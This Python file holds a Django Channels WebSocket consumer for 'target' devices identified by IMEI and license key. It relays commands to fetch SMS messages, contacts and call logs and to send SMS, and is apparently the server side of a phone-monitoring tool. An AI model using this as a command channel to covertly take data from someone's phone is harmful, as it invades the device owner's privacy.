import json
from channels.generic.websocket import AsyncWebsocketConsumer
import logging
from asgiref.sync import sync_to_async

logger = logging.getLogger(__name__)


class Consumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.id = self.scope['url_route']['kwargs']['id']
        self.imei = self.scope['url_route']['kwargs']['device_imei']
        self.license_key = self.scope['url_route']['kwargs']['license_key']

        self.group_name = f"target_{self.id}_{self.imei}_{self.license_key}"

        target_exists = await self.target_exist(self.id, self.imei, self.license_key)

        if not target_exists:
            await self.close()
            return

        await self.channel_layer.group_add(self.group_name, self.channel_name)

        # Join group
        await self.channel_layer.group_add(self.group_name, self.channel_name)
        await self.accept()
        logger.info(
            f"WebSocket connected for {self.id}, imei: {self.imei}, license_key: {self.license_key}")

        # Send initial connection confirmation
        await self.send(text_data=json.dumps({
            'type': 'connection_established',
            'message': 'Connected to message notifications'
        }))

    async def disconnect(self, close_code):
        # Leave group
        await self.channel_layer.group_discard(self.group_name, self.channel_name)
        logger.info(
            f"WebSocket disconnected for school {self.id}, code: {close_code}")

    # Receive message from WebSocket
    async def receive(self, text_data):
        try:
            text_data_json = json.loads(text_data)
            message_type = text_data_json.get('type', 'unknown')

            if message_type == 'ping':
                await self.send(text_data=json.dumps({
                    'type': 'pong',
                    'timestamp': text_data_json.get('timestamp')
                }))
        except json.JSONDecodeError:
            await self.send(text_data=json.dumps({
                'type': 'error',
                'message': 'Invalid JSON format'
            }))

    # Fetch messages from room group
    async def fetch_messages(self, event):
        # Send message to WebSocket
        await self.send(text_data=json.dumps({
            'type': 'fetch_messages',
            'messages': ""
        }))

    async def fetch_contacts(self, event):
        # Send message to WebSocket
        await self.send(text_data=json.dumps({
            'type': 'fetch_contacts',
            'contacts': ""
        }))
    
    async def fetch_call_logs(self, event):
        # Send message to WebSocket
        await self.send(text_data=json.dumps({
            'type': 'fetch_call_logs',
            'call_logs': ""
        }))

    async def send_sms(self, event):
        # Send message to WebSocket
        await self.send(text_data=json.dumps({
            'type': 'send_sms',
            'messages': event['messages']
        }))

    async def status_update(self, event):
        # Send status update to WebSocket
        await self.send(text_data=json.dumps({
            'type': 'status_update',
            'data': event['message']
        }))

    @sync_to_async
    def target_exist(self, id, imei, license_key):
        from authentication.models import Target
        target = Target.objects.filter(
            id=id, device_imei=imei, license_key=license_key)
        print(target.exists())
        return target.exists()
